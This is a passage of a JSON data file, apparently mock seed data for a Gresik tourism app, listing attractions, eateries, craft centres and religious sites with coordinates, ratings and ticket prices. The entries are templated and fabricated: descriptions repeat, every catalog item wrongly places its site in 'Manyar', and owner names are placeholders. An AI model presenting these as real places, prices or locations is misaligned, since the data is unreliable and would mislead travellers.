                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c124_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m125",
                "name": "Pengrajin Rebana Hadrah Balongpanggang",
                "owner": "Cak Santi",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.192776,
                    112.606257
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c125_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c125_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m126",
                "name": "Taman Pasir Bermain Duduksampeyan",
                "owner": "Cak Mega",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.191422,
                    112.609424
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c126_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c126_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m127",
                "name": "Sanggar Tari Kembang Wringinanom",
                "owner": "Cak Cak",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.373312,
                    112.753649
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c127_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c127_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m128",
                "name": "Pusat Lepas Tukik Driyorejo",
                "owner": "Cak Mak",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.222273,
                    112.61776
                ],
                "rating": 5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c128_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c128_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m129",
                "name": "Sego Ruwet Kedamean",
                "owner": "Cak Haji",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.255904,
                    112.734555
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c129_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c129_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m130",
                "name": "Bukit Kapur Menganti",
                "owner": "Cak Neng",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1464822759023-fed622ff2c3b?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.413227,
                    112.611359
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c130_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c130_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m131",
                "name": "Sentra Zikir Sidayu",
                "owner": "Cak Warkop",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.209111,
                    112.578331
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c131_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c131_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 45000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m132",
                "name": "Monumen Perjuangan Ujungpangkah",
                "owner": "Cak Sejarah",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.069514,
                    112.635653
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c132_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c132_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m133",
                "name": "Sentra Tenun Sarung Panceng",
                "owner": "Cak Keluarga",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.283988,
                    112.574192
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c133_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c133_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m134",
                "name": "Taman Bunga Indah Bungah",
                "owner": "Cak Backpacker",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1501785888041-af3ef285b470?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman bunga indah yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.086952,
                    112.633292
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c134_1",
                        "name": "Tiket / Menu Layanan Taman Bunga Indah",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Bunga Indah Manyar Gresik."
                    },
                    {
                        "id": "c134_2",
                        "name": "Paket Premium Taman Bunga Indah",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m135",
                "name": "Kerajinan Lampion Damar Kurung Tambak Bawean",
                "owner": "Cak Kulineran",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa kerajinan lampion damar kurung yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.175671,
                    112.664865
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c135_1",
                        "name": "Tiket / Menu Layanan Kerajinan Lampion Damar Kurung",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Kerajinan Lampion Damar Kurung Manyar Gresik."
                    },
                    {
                        "id": "c135_2",
                        "name": "Paket Premium Kerajinan Lampion Damar Kurung",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m136",
                "name": "Kebun Nanas Madu Sangkapura Bawean",
                "owner": "Cak Gresik",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1448375240586-882707db888b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa kebun nanas madu yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.293003,
                    112.674238
                ],
                "rating": 4.2,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c136_1",
                        "name": "Tiket / Menu Layanan Kebun Nanas Madu",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Kebun Nanas Madu Manyar Gresik."
                    },
                    {
                        "id": "c136_2",
                        "name": "Paket Premium Kebun Nanas Madu",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m137",
                "name": "Es Dawet Siwalan Kebomas",
                "owner": "Cak AlunAlun",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.249382,
                    112.629478
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c137_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c137_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m138",
                "name": "Puncak Awan Manyar",
                "owner": "Cak Ziarah",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1447752875215-b2761acb3c5d?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.216586,
                    112.5876
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c138_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c138_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m139",
                "name": "Makam Bupati Gresik Kota",
                "owner": "Cak Sidayu",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam bupati yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.393894,
                    112.750132
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c139_1",
                        "name": "Tiket / Menu Layanan Makam Bupati",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Bupati Manyar Gresik."
                    },
                    {
                        "id": "c139_2",
                        "name": "Paket Premium Makam Bupati",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m140",
                "name": "Makam Kuno Adipati Cerme",
                "owner": "Cak Bawean",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa makam kuno adipati yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.122033,
                    112.582142
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c140_1",
                        "name": "Tiket / Menu Layanan Makam Kuno Adipati",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Kuno Adipati Manyar Gresik."
                    },
                    {
                        "id": "c140_2",
                        "name": "Paket Premium Makam Kuno Adipati",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m141",
                "name": "Batik Goyor ATBM Benjeng",
                "owner": "Cak Ahmad",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa batik goyor atbm yang berada di kawasan strategis Kecamatan Benjeng, Gresik.",
                "coords": [
                    -7.126296,
                    112.570624
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c141_1",
                        "name": "Tiket / Menu Layanan Batik Goyor ATBM",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Batik Goyor ATBM Manyar Gresik."
                    },
                    {
                        "id": "c141_2",
                        "name": "Paket Premium Batik Goyor ATBM",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m142",
                "name": "Taman Kota Bertingkat Balongpanggang",
                "owner": "Cak Budi",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1544735716-392fe2489ffa?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman kota bertingkat yang berada di kawasan strategis Kecamatan Balongpanggang, Gresik.",
                "coords": [
                    -7.310331,
                    112.574765
                ],
                "rating": 4.3,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c142_1",
                        "name": "Tiket / Menu Layanan Taman Kota Bertingkat",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Kota Bertingkat Manyar Gresik."
                    },
                    {
                        "id": "c142_2",
                        "name": "Paket Premium Taman Kota Bertingkat",
                        "price": 40000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m143",
                "name": "Teater Rakyat Gresik Duduksampeyan",
                "owner": "Cak Lia",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1534447677768-be436bb09401?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa teater rakyat gresik yang berada di kawasan strategis Kecamatan Duduksampeyan, Gresik.",
                "coords": [
                    -7.190864,
                    112.641571
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c143_1",
                        "name": "Tiket / Menu Layanan Teater Rakyat Gresik",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Teater Rakyat Gresik Manyar Gresik."
                    },
                    {
                        "id": "c143_2",
                        "name": "Paket Premium Teater Rakyat Gresik",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m144",
                "name": "Pusat Karang Bawean Wringinanom",
                "owner": "Cak Roni",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1497633762265-9d179a990aa6?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat karang bawean yang berada di kawasan strategis Kecamatan Wringinanom, Gresik.",
                "coords": [
                    -7.12848,
                    112.566179
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c144_1",
                        "name": "Tiket / Menu Layanan Pusat Karang Bawean",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Karang Bawean Manyar Gresik."
                    },
                    {
                        "id": "c144_2",
                        "name": "Paket Premium Pusat Karang Bawean",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m145",
                "name": "Sego Ruwet Driyorejo",
                "owner": "Cak Santi",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu sego ruwet yang berada di kawasan strategis Kecamatan Driyorejo, Gresik.",
                "coords": [
                    -7.284302,
                    112.739485
                ],
                "rating": 4.7,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c145_1",
                        "name": "Tiket / Menu Layanan Sego Ruwet",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sego Ruwet Manyar Gresik."
                    },
                    {
                        "id": "c145_2",
                        "name": "Paket Premium Sego Ruwet",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m146",
                "name": "Bukit Kapur Kedamean",
                "owner": "Cak Mega",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1472214222541-d510753a4707?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa bukit kapur yang berada di kawasan strategis Kecamatan Kedamean, Gresik.",
                "coords": [
                    -7.195552,
                    112.744872
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c146_1",
                        "name": "Tiket / Menu Layanan Bukit Kapur",
                        "price": 25000,
                        "description": "Akses menikmati layanan berkualitas premium di Bukit Kapur Manyar Gresik."
                    },
                    {
                        "id": "c146_2",
                        "name": "Paket Premium Bukit Kapur",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m147",
                "name": "Makam Syekh Menganti",
                "owner": "Cak Cak",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung makam syekh yang berada di kawasan strategis Kecamatan Menganti, Gresik.",
                "coords": [
                    -7.10391,
                    112.752707
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c147_1",
                        "name": "Tiket / Menu Layanan Makam Syekh",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Makam Syekh Manyar Gresik."
                    },
                    {
                        "id": "c147_2",
                        "name": "Paket Premium Makam Syekh",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m148",
                "name": "Benteng Pertahanan Sidayu",
                "owner": "Cak Mak",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa benteng pertahanan yang berada di kawasan strategis Kecamatan Sidayu, Gresik.",
                "coords": [
                    -7.398414,
                    112.584942
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c148_1",
                        "name": "Tiket / Menu Layanan Benteng Pertahanan",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Benteng Pertahanan Manyar Gresik."
                    },
                    {
                        "id": "c148_2",
                        "name": "Paket Premium Benteng Pertahanan",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m149",
                "name": "Pengrajin Rebana Hadrah Ujungpangkah",
                "owner": "Cak Haji",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa pengrajin rebana hadrah yang berada di kawasan strategis Kecamatan Ujungpangkah, Gresik.",
                "coords": [
                    -7.119782,
                    112.688037
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c149_1",
                        "name": "Tiket / Menu Layanan Pengrajin Rebana Hadrah",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pengrajin Rebana Hadrah Manyar Gresik."
                    },
                    {
                        "id": "c149_2",
                        "name": "Paket Premium Pengrajin Rebana Hadrah",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m150",
                "name": "Taman Pasir Bermain Panceng",
                "owner": "Cak Neng",
                "type": "rekreasi",
                "image": "https://images.unsplash.com/photo-1534438327276-14e5300c3a48?auto=format&fit=crop&w=600&q=80",
                "description": "Wahana bermain dan rekreasi keluarga terpadu berupa taman pasir bermain yang berada di kawasan strategis Kecamatan Panceng, Gresik.",
                "coords": [
                    -7.158856,
                    112.600899
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c150_1",
                        "name": "Tiket / Menu Layanan Taman Pasir Bermain",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Taman Pasir Bermain Manyar Gresik."
                    },
                    {
                        "id": "c150_2",
                        "name": "Paket Premium Taman Pasir Bermain",
                        "price": 25000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m151",
                "name": "Sanggar Tari Kembang Bungah",
                "owner": "Cak Warkop",
                "type": "budaya",
                "image": "https://images.unsplash.com/photo-1589301760014-d929f3979dbc?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat pelestarian warisan budaya kesenian leluhur berupa sanggar tari kembang yang berada di kawasan strategis Kecamatan Bungah, Gresik.",
                "coords": [
                    -7.434672,
                    112.623097
                ],
                "rating": 4.9,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c151_1",
                        "name": "Tiket / Menu Layanan Sanggar Tari Kembang",
                        "price": 20000,
                        "description": "Akses menikmati layanan berkualitas premium di Sanggar Tari Kembang Manyar Gresik."
                    },
                    {
                        "id": "c151_2",
                        "name": "Paket Premium Sanggar Tari Kembang",
                        "price": 30000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m152",
                "name": "Pusat Lepas Tukik Tambak Bawean",
                "owner": "Cak Sejarah",
                "type": "edukasi",
                "image": "https://images.unsplash.com/photo-1503676260728-1c00da094a0b?auto=format&fit=crop&w=600&q=80",
                "description": "Pusat riset dan pembelajaran edukatif lapangan berupa pusat lepas tukik yang berada di kawasan strategis Kecamatan Tambak Bawean, Gresik.",
                "coords": [
                    -7.214425,
                    112.610404
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c152_1",
                        "name": "Tiket / Menu Layanan Pusat Lepas Tukik",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Pusat Lepas Tukik Manyar Gresik."
                    },
                    {
                        "id": "c152_2",
                        "name": "Paket Premium Pusat Lepas Tukik",
                        "price": 60000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m153",
                "name": "Es Dawet Siwalan Sangkapura Bawean",
                "owner": "Cak Keluarga",
                "type": "kuliner",
                "image": "https://images.unsplash.com/photo-1565557623262-b51c2513a641?auto=format&fit=crop&w=600&q=80",
                "description": "Warung makan tradisional khas menyajikan menu es dawet siwalan yang berada di kawasan strategis Kecamatan Sangkapura Bawean, Gresik.",
                "coords": [
                    -7.154956,
                    112.634754
                ],
                "rating": 4.5,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c153_1",
                        "name": "Tiket / Menu Layanan Es Dawet Siwalan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Es Dawet Siwalan Manyar Gresik."
                    },
                    {
                        "id": "c153_2",
                        "name": "Paket Premium Es Dawet Siwalan",
                        "price": 50000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m154",
                "name": "Puncak Awan Kebomas",
                "owner": "Cak Backpacker",
                "type": "alam",
                "image": "https://images.unsplash.com/photo-1500530855697-b586d89ba3ee?auto=format&fit=crop&w=600&q=80",
                "description": "Keindahan panorama alam tersembunyi berupa puncak awan yang berada di kawasan strategis Kecamatan Kebomas, Gresik.",
                "coords": [
                    -7.419495,
                    112.695954
                ],
                "rating": 4.6,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c154_1",
                        "name": "Tiket / Menu Layanan Puncak Awan",
                        "price": 15000,
                        "description": "Akses menikmati layanan berkualitas premium di Puncak Awan Manyar Gresik."
                    },
                    {
                        "id": "c154_2",
                        "name": "Paket Premium Puncak Awan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m155",
                "name": "Sentra Zikir Manyar",
                "owner": "Cak Kulineran",
                "type": "religi",
                "image": "https://images.unsplash.com/photo-1584551246679-0daf3d275d0f?auto=format&fit=crop&w=600&q=80",
                "description": "Situs sakral tempat beribadah dan ziarah agung sentra zikir yang berada di kawasan strategis Kecamatan Manyar, Gresik.",
                "coords": [
                    -7.215659,
                    112.753247
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c155_1",
                        "name": "Tiket / Menu Layanan Sentra Zikir",
                        "price": 30000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Zikir Manyar Gresik."
                    },
                    {
                        "id": "c155_2",
                        "name": "Paket Premium Sentra Zikir",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m156",
                "name": "Monumen Perjuangan Gresik Kota",
                "owner": "Cak Gresik",
                "type": "sejarah",
                "image": "https://images.unsplash.com/photo-1486406146926-c627a92ad1ab?auto=format&fit=crop&w=600&q=80",
                "description": "Bangunan bersejarah peninggalan purbakala berupa monumen perjuangan yang berada di kawasan strategis Kecamatan Gresik Kota, Gresik.",
                "coords": [
                    -7.236046,
                    112.666294
                ],
                "rating": 4.8,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c156_1",
                        "name": "Tiket / Menu Layanan Monumen Perjuangan",
                        "price": 10000,
                        "description": "Akses menikmati layanan berkualitas premium di Monumen Perjuangan Manyar Gresik."
                    },
                    {
                        "id": "c156_2",
                        "name": "Paket Premium Monumen Perjuangan",
                        "price": 55000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m157",
                "name": "Sentra Tenun Sarung Cerme",
                "owner": "Cak AlunAlun",
                "type": "belanja",
                "image": "https://images.unsplash.com/photo-1505253716362-afaea1d3d1af?auto=format&fit=crop&w=600&q=80",
                "description": "Sentra perdagangan belanja produk unggulan lokal berupa sentra tenun sarung yang berada di kawasan strategis Kecamatan Cerme, Gresik.",
                "coords": [
                    -7.261348,
                    112.69512
                ],
                "rating": 4.4,
                "reviewsCount": 3,
                "catalog": [
                    {
                        "id": "c157_1",
                        "name": "Tiket / Menu Layanan Sentra Tenun Sarung",
                        "price": 5000,
                        "description": "Akses menikmati layanan berkualitas premium di Sentra Tenun Sarung Manyar Gresik."
                    },
                    {
                        "id": "c157_2",
                        "name": "Paket Premium Sentra Tenun Sarung",
                        "price": 35000,
                        "description": "Fasilitas lengkap dobel terlaris porsi hemat bagi wisatawan."
                    }
                ]
            },
            {
                "id": "m158",
                "name": "Taman Bunga Indah Benjeng",
                "owner": "Cak Ziarah",
                "type": "rekreasi",
